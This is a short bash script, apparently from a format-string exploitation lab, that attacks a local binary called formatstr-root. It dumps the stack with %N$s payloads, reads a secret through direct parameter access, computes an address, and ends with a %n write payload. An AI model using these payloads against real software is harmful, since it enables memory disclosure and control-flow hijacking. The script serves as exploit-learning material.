#!/bin/bash
v=999
#echo -e $x "\x41\x41\x41\x41.%10\$d" | ./formatstring

echo "Looping through to view stack"

for i in {1..10}
do
    echo -e $v "%$i\$s" | ./formatstr-root
    echo "done $i"
    echo " "
done

echo "Secret is 0x44 = 'D' which appeared at the 8th iteration, use format string direct access %8\$s"
echo -e $v "%8\$s" | ./formatstr-root
echo " "

echo "%x reads the hex value, which matches the secret address"
#ADDR0=$(echo -e $v "%8\$p" | ./formatstr-root)

#ADDR=$(echo -e $v "%8\$p" | ./formatstr-root | sed -n 2p)
#echo "$(($ADDR+4))"

#echo -e $v "%8\$p" | ./formatstr-root | sed -n 7p
ADDR0="$(echo -e $v "%8\$d" | ./formatstr-root | sed -n 7p)"
echo "$ADDR0"
echo $(($ADDR0+0x04))
ADDR1=$(printf "%X" $(($ADDR0+0x04)))
echo "$ADDR1"

echo "Now read an address "
echo -e $v "AAAA%10\$n" | ./formatstr-root
